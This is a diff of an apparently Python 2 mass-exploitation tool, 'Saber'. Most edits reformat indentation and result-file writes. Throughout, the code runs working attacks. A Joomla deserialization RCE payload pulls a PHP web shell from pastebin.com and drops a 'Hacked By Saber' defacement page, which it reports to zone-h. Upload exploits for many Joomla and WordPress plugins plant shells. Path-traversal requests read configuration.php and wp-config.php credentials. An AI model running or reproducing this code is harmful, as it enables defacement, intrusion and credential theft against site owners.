@@ -24,9 +24,9 @@ logo = """
 requests.urllib3.disable_warnings()
 #results
 if not os.path.exists("results"):
-	os.mkdir("results", 0755);
+    os.mkdir("results", 0755);
 if not os.path.exists("tmp"):
-	os.mkdir("tmp", 0755);
+    os.mkdir("tmp", 0755);
 #Variables
 rev = 'revsaber.zip'
 grav = 'saber.jpg'
@@ -46,35 +46,35 @@ user_agent = "Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/
 payload = """  fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/saber.php','w+'),file_get_contents('https://pastebin.com/raw/nmcSiKfw')); fwrite(fopen($_SERVER['DOCUMENT_ROOT']."/images/saber.php","w+"),file_get_contents("https://pastebin.com/raw/nmcSiKfw"));fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/LOL.html','w+'),' Hacked By Saber ');"""
 #Zone-h
 def zone(url) :
-	r = requests.post("http://zone-h.com/notify/single", data={'defacer': 'fallag kill3r', 'domain1': url, 'hackmode': 1, 'reason': 1})
-	if 'ERROR' in  r.content :
-		print color.RED+"Zone-H : ERROR"
-	else :
-		print color.GREEN+"Zone-H : OK"
+    r = requests.post("http://zone-h.com/notify/single", data={'defacer': 'fallag kill3r', 'domain1': url, 'hackmode': 1, 'reason': 1})
+    if 'ERROR' in  r.content :
+        print color.RED+"Zone-H : ERROR"
+    else :
+        print color.GREEN+"Zone-H : OK"
 #RCE
 def prepare(url, ua):
-	try:
-		global user_agent
-		headers = {
-			'User-Agent' : user_agent,
-			'x-forwarded-for' : ua
-		}
-		cookies = urllib2.Request(url, headers=headers)
-		result = urllib2.urlopen(cookies)
-		cookieJar = result.info().getheader('Set-Cookie')
-		injection = urllib2.Request(url, headers=headers)
-		injection.add_header('Cookie', cookieJar)
-		urllib2.urlopen(injection)
-	except:
-		pass
+    try:
+        global user_agent
+        headers = {
+            'User-Agent' : user_agent,
+            'x-forwarded-for' : ua
+        }
+        cookies = urllib2.Request(url, headers=headers)
+        result = urllib2.urlopen(cookies)
+        cookieJar = result.info().getheader('Set-Cookie')
+        injection = urllib2.Request(url, headers=headers)
+        injection.add_header('Cookie', cookieJar)
+        urllib2.urlopen(injection)
+    except:
+        pass
 def toCharCode(string):
-	try:
-		encoded = ""
-		for char in string:
-			encoded += "chr({0}).".format(ord(char))
-		return encoded[:-1]
-	except:
-		pass
+    try:
+        encoded = ""
+        for char in string:
+            encoded += "chr({0}).".format(ord(char))
+        return encoded[:-1]
+    except:
+        pass
 def generate(payload):
     php_payload = "eval({0})".format(toCharCode(payload))
     terminate = '\xf0\xfd\xfd\xfd';
@@ -84,54 +84,54 @@ def generate(payload):
     exploit_template += r''';s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}''' + terminate
     return exploit_template
 def rce(url):
-	try:
-		global payload
-		payload_generated = generate(payload)
-		prepare(url, payload_generated)
-		tester = urllib2.urlopen(url+"/saber.php").read()
-		ww = requests.get(url+"/LOL.html")
-		if re.findall("Saber", tester) and urllib2.urlopen(url+"/saber.php").getcode() == 200 and "Hacked" in ww.content:
-			site = url + "/saber.php"
-			site2 = url + "/LOL.html"
-			print color.GREEN+"Defaced > "+site2
-			zone(site2)
-			print color.GREEN+"Shell uploaded > "+site
-			save = open('results/shells.txt', 'a')
-			save.write(site+'\n')
-			save.close()
-			deface = open('results/index.txt', 'a')
-			deface.write(site2+'\n')
-			deface.close()
-	except:
-		print color.RED+"[RCE]-NOT VULUN"
-		pass
+    try:
+        global payload
+        payload_generated = generate(payload)
+        prepare(url, payload_generated)
+        tester = urllib2.urlopen(url+"/saber.php").read()
+        ww = requests.get(url+"/LOL.html")
+        if re.findall("Saber", tester) and urllib2.urlopen(url+"/saber.php").getcode() == 200 and "Hacked" in ww.content:
+            site = url + "/saber.php"
+            site2 = url + "/LOL.html"
+            print color.GREEN+"Defaced > "+site2
+            zone(site2)
+            print color.GREEN+"Shell uploaded > "+site
+            with open("results/index.txt", 'a') as neo:
+                neo.write("%s" %  site2)
+                neo.write("\n")
+            with open("results/shells.txt", 'a') as neo:
+                neo.write("%s" %  site)
+                neo.write("\n")
+    except:
+        print color.RED+"[RCE]-NOT VULUN"
+        pass
 #JCE
 def jce(site):
-	try :
-	    global zebi
-	    files = {'Filedata': open(zebi, 'rb')}
-	    post = {
-	        'upload-dir': '../../',
-	        'upload-overwrite': '0',
-	        'action': 'upload'
-	    }
-	    url = site + "/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form"
-	    html = urllib2.urlopen(url).readlines()
-	    for line in html:
-	        if re.findall('No function call specified', line):
-	            req = requests.post(url,files=files, data=post)
-	            if req.status_code == 200 or 'success' in req.text:
-	                url = url.replace('/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form', '/' + zebi)
-	                if requests.get(url).status_code == 200:
-	                    print color.BOLD+"[VULUN] "+url
-	                    zone(url)
-	                    save = open('results/index.txt')
-	                    save.write(url+'\n')
-	                    save.close()
-		        else:
-		        	print color.RED+"[JCE]-NOT VULUN"
-	except :
-		pass
+    try :
+        global zebi
+        files = {'Filedata': open(zebi, 'rb')}
+        post = {
+            'upload-dir': '../../',
+            'upload-overwrite': '0',
+            'action': 'upload'
+        }
+        url = site + "/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form"
+        html = urllib2.urlopen(url).readlines()
+        for line in html:
+            if re.findall('No function call specified', line):
+                req = requests.post(url,files=files, data=post)
+                if req.status_code == 200 or 'success' in req.text:
+                    url = site+'/LOL.gif'
+                    if requests.get(url).status_code == 200:
+                        print color.BOLD+"[VULUN] "+url
+                        zone(url)
+                        with open("results/index.txt", 'a') as neo:
+                            neo.write("%s" %  url)
+                            neo.write("\n")
+                else:
+                    print color.RED+"[JCE]-NOT VULUN"
+    except :
+        pass
 def alberghi(site):
     try:
         global terma
@@ -144,13 +144,13 @@ def alberghi(site):
                 if req.status_code == 200 or 'success' in req.text:
                     url = url.replace('/administrator/components/com_alberghi/upload.alberghi.php', '/administrator/components/com_alberghi/' + terma)
                     if urllib2.urlopen(url).getcode() == 200:
-                    	print color.BOLD+"Alberghi-[VULUN] => "+url
-                    	zone(url)
-                    	with open('results/index.txt') as f :
-                    		f.write(url+'\n')
-
+                        print color.BOLD+"Alberghi-[VULUN] => "+url
+                        zone(url)
+                        with open("results/index.txt", 'a') as neo:
+                            neo.write("%s" %  url)
+                            neo.write("\n")
     except:
-    	print color.RED+"[AlBerghi]-NOT VULUN"
+        print color.RED+"[AlBerghi]-NOT VULUN"
         pass
 def jceshell(site):
     try:
@@ -169,12 +169,11 @@ def jceshell(site):
             readbing = openbing.read()
             if re.findall("Saber", readbing):
                 print color.BOLD+"[JCE_SHELL]-VULUN >",url
-                save = open('results/shells.txt', 'a')
-                save.write(url+'\n')
-                save.close()
-
+                with open("results/shells.txt", 'a') as neo:
+                    neo.write("%s" %  url)
+                    neo.write("\n")
     except:
-    	print color.RED+"[JCE Shell]-NOT VULUN"
+        print color.RED+"[JCE Shell]-NOT VULUN"
 def adsmanager(site):
     try:
         global ads
@@ -194,11 +193,11 @@ def adsmanager(site):
                     readbing = openbing.read()
                     if re.findall("Saber", readbing):
                         print color.BOLD+"[AdsManager]-VULUN > "+url
-                        save = open('results/shells.txt', 'a')
-                        save.write(url+'\n')
-                        save.close()
+                        with open("results/shells.txt", 'a') as neo:
+                            neo.write("%s" %  url)
+                            neo.write("\n")
     except:
-    	print color.RED+"[AdsManager Shell]-NOT VULUN"
+        print color.RED+"[AdsManager Shell]-NOT VULUN"
         pass
 def adsindex(site):
     try:
@@ -218,13 +217,13 @@ def adsindex(site):
                     openbing = urllib2.urlopen(url)
                     readbing = openbing.read()
                     if re.findall("Saber", readbing):
-                    	print color.BOLD+"[AdsManager_Index]-VULUN > "+url
-                    	save = open('results/index.txt', 'a')
-                    	save.write(url+'\n')
-                    	save.close()
+                        print color.BOLD+"[AdsManager_Index]-VULUN > "+url
+                        with open("results/index.txt", 'a') as neo:
+                            neo.write("%s" %  url)
+                            neo.write("\n")
 
     except:
-    	print color.RED+"[AdsManager Index]-NOT VULUN"
+        print color.RED+"[AdsManager Index]-NOT VULUN"
         pass
 def modsimplefileupload(site):
     Exploit = '//modules/mod_simplefileuploadv1.3/elements/udd.php'
@@ -235,12 +234,13 @@ def modsimplefileupload(site):
             "submit": "Upload"
         }
         GoT = requests.post(site + Exploit, files=IndeXfile, data=post, timeout=5)
-        check =requests.get(site+'//modules/mod_simplefileuploadv1.3/elements/saber.php')
-        if 'Saber' in check.content:
-            print color.GREEN+"[ModSimpleFileUpload]-VULUN "+site+'///modules/mod_simplefileuploadv1.3/elements/saber.php'
-            save= open('results/shells.txt', 'a')
-            save.write(site+'///modules/mod_simplefileuploadv1.3/elements/saber.php'+'\n')
-            save.close()
+        url = site+'//modules/mod_simplefileuploadv1.3/elements/saber.php'
+        check =requests.get(url)
+        if 'Saber BOT V1' in check.content:
+            print color.GREEN+"[ModSimpleFileUpload]-VULUN "+url
+            with open("results/shells.txt", 'a') as neo:
+                neo.write("%s" %  url)
+                neo.write("\n")
         else:
             print color.RED+"[ModSimpleFileUpload]-NOT VULUN"
     except:
@@ -272,11 +272,11 @@ def fabric_index(site):
             readbing = openbing.read()
             if re.findall("Hacked", readbing):
                 print color.BOLD+"[Com_Fabrik Index]-VULUN > "+url
-                save = open('results/index.txt', 'a')
-                save.write(url+'\n')
-                save.close()
+                with open("results/index.txt", 'a') as neo:
+                    neo.write("%s" %  url)
+                    neo.write("\n")
         else:
-        	print color.RED+"[Com_Fabrik]-NOT VULUN"
+            print color.RED+"[Com_Fabrik]-NOT VULUN"
     except:
         pass
 def myblog(site):
@@ -294,11 +294,11 @@ def myblog(site):
             readtest2 = test2.read()
             if re.findall("Saber", readbing) or re.findall("Tryag File Manager", readtest2):
                 print color.BOLD+"[Com_MyBlog]-VULUN > "+url
-                save = open('results/shells.txt', 'a')
-                save.write(url+'\n')
-                save.close()
+                with open("results/shells.txt", 'a') as neo:
+                    neo.write("%s" %  url)
+                    neo.write("\n")
         else:
-        	print color.RED+"[MyBlog]-NOT VULUN"
+            print color.RED+"[MyBlog]-NOT VULUN"
     except:
         pass
 def cckjseblod(url):
@@ -308,9 +308,9 @@ def cckjseblod(url):
         if content != "" and not "failed to open stream" in content and re.findall("JConfig", content):
             site = url + "/index.php?option=com_cckjseblod&task=download&file=configuration.php"
             print color.BOLD+"[cckjseblod]-VULUN > "+site
-            save = open('results/JomConfig.txt', 'a')
-            save.write(site+'\n')
-            save.close()
+            with open("results/config.txt", 'a') as neo:
+                neo.write("%s" %  url)
+                neo.write("\n")
         else:
             print color.RED+"[cckjseblod]-NOT VULUN"
     except urllib2.HTTPError:
@@ -324,13 +324,13 @@ def macgallery(url):
         if content != "" and not "failed to open stream" in content and re.findall("JConfig", content):
             site = url + "/index.php?option=com_macgallery&view=download&albumid=../../configuration.php"
             print color.BOLD+"[MacGallery]-VULUN > "+site
-            save= open('results/JomConfig.txt', 'a')
-            save.write(site+'\n')
-            save.close()
+            with open("results/config.txt", 'a') as neo:
+                neo.write("%s" %  url)
+                neo.write("\n")
         else:
             pass
     except urllib2.HTTPError:
-    	print color.RED+"[MacGallery]-NOT VULUN"
+        print color.RED+"[MacGallery]-NOT VULUN"
         pass
     except urllib2.URLError:
         pass
@@ -342,50 +342,51 @@ def hdflvplayer(url):
         if content != "" and not "failed to open stream" in content and re.findall("JConfig", content):
             site = url + "/components/com_hdflvplayer/hdflvplayer/download.php?f=../../../configuration.php"
             print color.BOLD+"[HdfVPlayer]-VULUN > "+site
-            save = open('results/JomConfig.txt', 'a')
-            save.write(site+'\n')
-            save.close()
+            with open("results/config.txt", 'a') as neo:
+                neo.write("%s" %  url)
+                neo.write("\n")
 
     except urllib2.HTTPError:
-    	print color.RED+"[HdflVplayer]-NOT VULUN"
+        print color.RED+"[HdflVplayer]-NOT VULUN"
         pass
     except urllib2.URLError:
         pass
 #------------Wordpress-------
 #revgetconfig
 def revslidergetconfig(url):
-	try : 
-		response = urllib2.urlopen(url+'/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php')
-		r = requests.get(url+'/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php')
-		html = response.read()
-		if "DB" in html:
-			print color.BOLD+"[Revslider Get Config]-VULUN > "+site
-			save = open('results/WpConfig.txt', 'a')
-			save.write(html)
-		else:
-			print color.RED+"[revslidergetconfig]-NOT VULUN"
-	except :
-		pass
+    try : 
+        response = urllib2.urlopen(url+'/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php')
+        r = requests.get(url+'/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php')
+        html = response.read()
+        if "DB" in html:
+            print color.BOLD+"[Revslider Get Config]-VULUN > "+site
+            with open("results/index.txt", 'a') as neo:
+                neo.write("%s" %  site)
+                neo.write("\n")
+        else:
+            print color.RED+"[revslidergetconfig]-NOT VULUN"
+    except :
+        pass
 #addblockurl
 def addblockurl(url):
-	global up
-	try : 
-		ShellFile = {'popimg': open('saber.php', 'rb')}
-		poc = url+'/wp-admin/admin-ajax.php?action=getcountryuser&cs=2'
-		rep = requests.post(url, files=ShellFile)
-		now = datetime.datetime.now()
-		new = url+'/wp-content/uploads/'+str(now.year)+'/0'+str(now.month)+'/'+'saber.php'
-		w = requests.get(new)
-		if 'Saber' in w.content :
-			print color.BOLD+"[AddBlockUrl]-VULUN > "+new
-			save = open('results/shells.txt')
-			save.write(new+'\n')
-			save.close()
-		else:
-			print color.RED+"[AddBlockUrl]-NOT VULUN"
-	except:
-		print color.RED+"[AddBlockUrl]-NOT VULUN"
-		pass
+    global up
+    try : 
+        ShellFile = {'popimg': open('saber.php', 'rb')}
+        poc = url+'/wp-admin/admin-ajax.php?action=getcountryuser&cs=2'
+        rep = requests.post(url, files=ShellFile)
+        now = datetime.datetime.now()
+        new = url+'/wp-content/uploads/'+str(now.year)+'/0'+str(now.month)+'/'+'saber.php'
+        w = requests.get(new)
+        if 'Saber BOT V1' in w.content :
+            print color.BOLD+"[AddBlockUrl]-VULUN > "+new
+            with open("results/index.txt", 'a') as neo:
+                neo.write("%s" %  new)
+                neo.write("\n")
+        else:
+            print color.RED+"[AddBlockUrl]-NOT VULUN"
+    except:
+        print color.RED+"[AddBlockUrl]-NOT VULUN"
+        pass
 #cherry
 def cherry(url):
     global cher
@@ -414,13 +415,13 @@ def sexycontacoform(site):
         IndeXfile = {'file[]': open('saber.php', 'rb')}
         GoT = requests.post(site + Exploit, files=IndeXfile, timeout=5)
         check =requests.get(site+'//wp-content/plugins/sexy-contact-form/includes/fileupload/files/saber.php')
-        if 'Saber' in check.content:
+        if 'Saber BOT V1' in check.content:
             print color.GREEN+"[SexyContatctForm]-VULUN "+site+'//wp-content/plugins/sexy-contact-form/includes/fileupload/files/saber.php'
             save= open('results/shells.txt', 'a')
             save.write(site+'//wp-content/plugins/sexy-contact-form/includes/fileupload/files/saber.php'+'\n')
             save.close()
         else:
-	        print color.RED+"[SexyContatctForm]-NOT VULUN"
+            print color.RED+"[SexyContatctForm]-NOT VULUN"
     except:
         print color.RED+"[SexyContatctForm]-NOT VULUN"
         pass
@@ -434,16 +435,16 @@ def reflexgallery(site):
         try : 
             req = requests.post(url, files=files)
             ww = requests.get(site+'/wp-content/uploads/'+str(now.year)+'/0'+str(now.month)+'/'+'saber.php')
-            if 'Saber' in ww.content :
+            if 'Saber BOT V1' in ww.content :
                 print color.BOLD+site+'/wp-content/uploads/'+str(now.year)+'/0'+str(now.month)+'/'+'saber.php'
                 save = open('results/shells.txt', 'a')
-                save.write(site+'/wp-content/uploads/'+str(now.year)+'/0'+str(now.month)+'/'+'saber.php')
+                save.write(site+'/wp-content/uploads/'+str(now.year)+'/0'+str(now.month)+'/'+'saber.php'+'\n')
                 save.close()
             else:
-            	print color.RED+"[ReflexGallery]-Not Vulun"
+                print color.RED+"[ReflexGallery]-Not Vulun"
         except :
-	            pass
-	            print color.RED+"[ReflexGallery]-Not Vulun"
+                pass
+                print color.RED+"[ReflexGallery]-Not Vulun"
 
 def wysija(site):
     try:
@@ -455,7 +456,7 @@ def wysija(site):
         GoT = requests.post(url, files=FileShell, data=PostData, headers=UserAgent, timeout=10)
         sh =site + '/wp-content/uploads/wysija/themes/zebi/saber.php'
         CheckShell = requests.get(sh, timeout=5)
-        if 'Saber' in CheckShell.content :
+        if 'Saber BOT V1' in CheckShell.content :
             print color.GREEN+"[wysija]-VUlun : "+sh
         else:
             print color.RED+"[Wysija]-Not Vulun"
@@ -468,13 +469,13 @@ def wtffu(site):
         Exploit = '//wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/'
         exp = site+Exploit
         GoT = requests.post(exp, files=ShellFile, timeout=5)
-        if 'Saber' in GoT.content :
+        if 'Saber BOT V1' in GoT.content :
             print color.GREEN+"[WorkTheFlow]-Vulun : "+site+'//wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/files/saber.php'
             save = open('resulst/shells.txt', 'a')
             save.write(site+'//wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/files/saber.php'+'\n')
             save.close()
         else:
-        	print color.RED+"[WorkTheFlow]-Not Vulun"
+            print color.RED+"[WorkTheFlow]-Not Vulun"
     except :
         print color.RED+"[WorkTheFlow]-Not Vulun"
         pass
@@ -484,36 +485,36 @@ def wpshop(site):
         Exploit = '/wp-content/plugins/wpshop/includes/ajax.php?elementCode=ajaxUpload/'
         exp = site+Exploit
         GoT = requests.post(exp, files=ShellFile, timeout=5)
-        if 'Saber' in GoT.content :
+        if 'Saber BOT V1' in GoT.content :
             print color.GREEN+"[WPShop]-Vulun"+site+'//wp-content/uploads/saber.php'
             save = open('resulst/shells.txt', 'a')
             save.write(site+'//wp-content/uploads/saber.php'+'\n')
             save.close()
         else:
-        	print color.RED+"[WPShop]-Not Vulun"
+            print color.RED+"[WPShop]-Not Vulun"
     except :
         print color.RED+"[WPShop]-Not Vulun"
         pass
 def formcaft(site):
-	global up
-	ww = site+'/wp-content/plugins/formcraft/file-upload/server/php/'
-	shell = open(up, "r")
-	payload = {"files[]" : shell}
-	bypass = {"new_name" : "ss.php"}
-	try :
-		files={'file':(cher, open(up,'rb'),'multipart/form-data')}
-		rep = requests.post(ww, data=bypass, files=payload)
-		pp = requests.get(site+'/wp-content/plugins/formcraft/file-upload/server/php/files/saber.php')
-		if 'Saber' in pp.content:
-			print color.GREEN+"[FormCat]-VULUN "+site+'/wp-content/plugins/formcraft/file-upload/server/php/files/saber.php'
-			save= open('results/shells.txt', 'a')
-			save.write(site+'/wp-content/plugins/formcraft/file-upload/server/php/files/saber.php'+'\n')
-			save.close()
-		else:
-			print color.RED+"[FormCaft Plugin]-NOT VULUN"
-	except :
-		print color.RED+"[FormCaft Plugin]-NOT VULUN"
-		pass
+    global up
+    ww = site+'/wp-content/plugins/formcraft/file-upload/server/php/'
+    shell = open(up, "r")
+    payload = {"files[]" : shell}
+    bypass = {"new_name" : "ss.php"}
+    try :
+        files={'file':(cher, open(up,'rb'),'multipart/form-data')}
+        rep = requests.post(ww, data=bypass, files=payload)
+        pp = requests.get(site+'/wp-content/plugins/formcraft/file-upload/server/php/files/saber.php')
+        if 'Saber BOT V1' in pp.content:
+            print color.GREEN+"[FormCat]-VULUN "+site+'/wp-content/plugins/formcraft/file-upload/server/php/files/saber.php'
+            save= open('results/shells.txt', 'a')
+            save.write(site+'/wp-content/plugins/formcraft/file-upload/server/php/files/saber.php'+'\n')
+            save.close()
+        else:
+            print color.RED+"[FormCaft Plugin]-NOT VULUN"
+    except :
+        print color.RED+"[FormCaft Plugin]-NOT VULUN"
+        pass
 #levo
 
 #powerzoom
@@ -545,21 +546,21 @@ def gravity(site):
     url = site+'/?gf_page=upload'
     ww = requests.get(url)
     if not """ {"status" : "error", "error" : {"code": 500, "message": "Failed to upload file."}} """ in ww.content :
-    	print color.RED+"[GravityForm]-NOT VULUN"
-    	pass
+        print color.RED+"[GravityForm]-NOT VULUN"
+        pass
     else :
-	    try : 
-	        req = requests.post(url, files=fileDeface, data=post_data)
-	        if "ok" in req.content :
-	            print color.BOLD+"[Gravity Form]-VULUN > "+site+'/wp-content/uploads/_input_3_saber.php'
-	            save= open('results/shells.txt', 'a')
-	            save.write(site+'/wp-content/uploads/_input_3_saber.php'+'\n')
-	            save.close()
-	        else:
-	        	print color.RED+"[Gravity Form Shell]-NOT VULUN"
-	        	gravindex(site)
-	    except:
-	        pass
+        try : 
+            req = requests.post(url, files=fileDeface, data=post_data)
+            if "ok" in req.content :
+                print color.BOLD+"[Gravity Form]-VULUN > "+site+'/wp-content/uploads/_input_3_saber.php'
+                save= open('results/shells.txt', 'a')
+                save.write(site+'/wp-content/uploads/_input_3_saber.php'+'\n')
+                save.close()
+            else:
+                print color.RED+"[Gravity Form Shell]-NOT VULUN"
+                gravindex(site)
+        except:
+            pass
 def downloadsmanager(site):
         files = {'upfile': ('saber.php', open('saber.php', 'rb'), 'multipart/form-data')}
         post = {
@@ -569,13 +570,13 @@ def downloadsmanager(site):
         try : 
             req = requests.post(url, files=files, data=post)
             ww = requests.get(site+"/wp-content/plugins/downloads-manager/upload/saber.php")
-            if 'Saber' in ww.content :
+            if 'Saber BOT V1' in ww.content :
                 print color.BOLD+"[VULUN]-"+site+"//wp-content/plugins/downloads-manager/upload/saber.php"
                 save = open('results/shells.txt', 'a')
-                save.write(site+"//wp-content/plugins/downloads-manager/upload/saber.php")
+                save.write(site+"//wp-content/plugins/downloads-manager/upload/saber.php"+"\n")
                 save.close()
             else:
-            	print color.RED+"[DownloadsManager]-Not Vulun"
+                print color.RED+"[DownloadsManager]-Not Vulun"
 
         except :
             pass
@@ -589,13 +590,13 @@ def inboundiomarketing(site):
         try : 
             req = requests.post(url, files=files, data=post)
             ww = requests.get(site+"//wp-content/plugins/inboundio-marketing/admin/partials/uploaded_csv/saber.php")
-            if 'Saber' in ww.content :
+            if 'Saber BOT V1' in ww.content :
                 print color.BOLD+site+"//wp-content/plugins/inboundio-marketing/admin/partials/uploaded_csv/saber.php"
                 save = open('results/shells.txt', 'a')
-                save.write(site+"///wp-content/plugins/inboundio-marketing/admin/partials/uploaded_csv//saber.php")
+                save.write(site+"///wp-content/plugins/inboundio-marketing/admin/partials/uploaded_csv//saber.php"+'\n')
                 save.close()
             else:
-            	print color.RED+"[InboundioMarketing]-Not Vulun"
+                print color.RED+"[InboundioMarketing]-Not Vulun"
         except :
             pass
 
@@ -606,13 +607,13 @@ def phpeventcalendar(site):
         exp = site+Exploit
         GoT = requests.post(exp, files=ShellFile, timeout=5)
         checkk = requests.get(site+'/wp-content/plugins/php-event-calendar/server/file-uploader/saber.php')
-        if 'Saber' in checkk.content :
+        if 'Saber BOT V1' in checkk.content :
             print color.GREEN+"[PhPCalendarEvenet]-Vulun : "+site+'/wp-content/plugins/php-event-calendar/server/file-uploader/saber.php'
             save = open('resulst/shells.txt', 'a')
             save.write(site+'/wp-content/plugins/php-event-calendar/server/file-uploader/saber.php'+'\n')
             save.close()
         else:
-        	print color.RED+"[PhpCalendarEvent]-Not Vulun"
+            print color.RED+"[PhpCalendarEvent]-Not Vulun"
     except :
         print color.RED+"[PhpCalendarEvent]-Not Vulun"
         pass
@@ -627,62 +628,62 @@ def revslider(site):
             if '/wp-content/plugins/revslider/' in CheckRevslider.text.encode('utf-8'):
                 requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=5)
                 ShellCheck = requests.get(site +'/wp-content/plugins/revslider/temp/update_extract//revslider/saber.php', timeout=5)
-                if 'Saber' in ShellCheck.content :
+                if 'Saber BOT V1' in ShellCheck.content :
                     print "[revslider Shell]-VULUN > "+site+'//wp-content/plugins/revslider/temp/update_extract//revslider/saber.php'
                     save= open('results/shells.txt', 'a')
                     save.write(site+'//wp-content/plugins/revslider/temp/update_extract//revslider/saber.php'+'\n')
             elif '/wp-content/themes/Avada/' in CheckRevslider.text.encode('utf-8'):
                 requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=5)
                 ShellCheck = requests.get(site +'/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/saber.php', timeout=5)
-                if 'Saber' in ShellCheck.content :
+                if 'Saber BOT V1' in ShellCheck.content :
                     print color.GREEN+site+"[Revslider Avada Shell]-VULUN > "+site+'/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/saber.php'
                     save= open('results/shells.txt', 'a')
                     save.write(site+'/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/saber.php'+'\n')
             elif '/wp-content/themes/striking_r/' in CheckRevslider.text.encode('utf-8'):
                 requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=5)
                 ShellCheck = requests.get(site +'//wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/saber.php', timeout=5)
-                if 'Saber' in ShellCheck.content :
+                if 'Saber BOT V1' in ShellCheck.content :
                     print color.GREEN+"[Revslider striking_r Shell]-VULUN > "+site+'//wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/saber.php'
                     save= open('results/shells.txt', 'a')
                     save.write(site+'//wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/saber.php'+'\n')
             elif '//wp-content/themes/IncredibleWP/' in CheckRevslider.text.encode('utf-8'):
                 requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=5)
                 ShellCheck = requests.get(site +'//wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/saber.php', timeout=5)
-                if 'Saber' in ShellCheck.content :
+                if 'Saber BOT V1' in ShellCheck.content :
                     print color.GREEN+"[Revslider IncredibleWP Shell]-VULUN > "+site+'/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/saber.php'
                     save= open('results/shells.txt', 'a')
                     save.write(site+'//wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/saber.php'+'\n')
             elif '//wp-content/themes/ultimatum/' in CheckRevslider.text.encode('utf-8'):
                 requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=5)
                 ShellCheck = requests.get(site +'//wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/saber.php', timeout=5)
-                if 'Saber' in ShellCheck.content :
+                if 'Saber BOT V1' in ShellCheck.content :
                     print color.GREEN+"[Revslider ultimatum Shell]-VULUN > "+site+'/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/saber.php'
                     save= open('results/shells.txt', 'a')
                     save.write(site+'//wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/saber.php'+'\n')
             elif '//wp-content/themes/medicate' in CheckRevslider.text.encode('utf-8'):
                 requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=5)
                 ShellCheck = requests.get(site +'/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/saber.php', timeout=5)
-                if 'Saber' in ShellCheck.content :
+                if 'Saber BOT V1' in ShellCheck.content :
                     print color.GREEN+"[Revslider medicate Shell]-VULUN > "+site+'/wp-content/themes/medicate/script/revslider/temp/update_extract/update_extract/saber.php'
                     save= open('results/shells.txt', 'a')
                     save.write(site+'//wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/saber.php'+'\n')
             elif '//wp-content/themes/centum/' in CheckRevslider.text.encode('utf-8'):
                 requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=5)
                 ShellCheck = requests.get(site +'/wp-content/themes/centum/revslider/temp/update_extract/revslider/saber.php', timeout=5)
-                if 'Saber' in ShellCheck.content :
+                if 'Saber BOT V1' in ShellCheck.content :
                     print color.GREEN+"[Revslider centum Shell]-VULUN > "+site+'//wp-content/themes/centum/revslider/temp/update_extract/revslider/saber.php'
                     save= open('results/shells.txt', 'a')
                     save.write(site+'///wp-content/themes/centum/revslider/temp/update_extract/revslider/saber.php'+'\n')
             elif '//wp-content/themes/beach_apollo/' in CheckRevslider.text.encode('utf-8'):
                 requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=5)
                 ShellCheck = requests.get(site +'/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/saber.php', timeout=5)
-                if 'Saber' in ShellCheck.content :
+                if 'Saber BOT V1' in ShellCheck.content :
                     print color.GREEN+"[Revslider centum Shell]-VULUN > "+site+'//wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/saber.php'
                     save= open('results/shells.txt', 'a')
                     save.write(site+'//wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/saber.php'+'\n')
-        	else:
-        		print color.RED+"[AddBlockUrl]-NOT VULUN"
-        		pass
+            else:
+                print color.RED+"[AddBlockUrl]-NOT VULUN"
+                pass
         except:
             print color.RED+"[Revslider]-Not Vulun"
             pass
@@ -695,17 +696,17 @@ def zoomsound(site):
         try : 
             req = requests.post(url, files=files)
             ww = requests.get(site+"///wp-content/plugins/dzs-zoomsounds/admin/upload/saber.php")
-            if 'Saber' in ww.content :
+            if 'Saber BOT V1' in ww.content :
                 print color.BOLD+site+"///wp-content/plugins/dzs-zoomsounds/admin/upload/saber.php"
                 save = open('results/shells.txt', 'a')
-                save.write(site+"////wp-content/plugins/dzs-zoomsounds/admin/upload/saber.php")
+                save.write(site+"////wp-content/plugins/dzs-zoomsounds/admin/upload/saber.php"+'\n')
                 save.close()
             else:
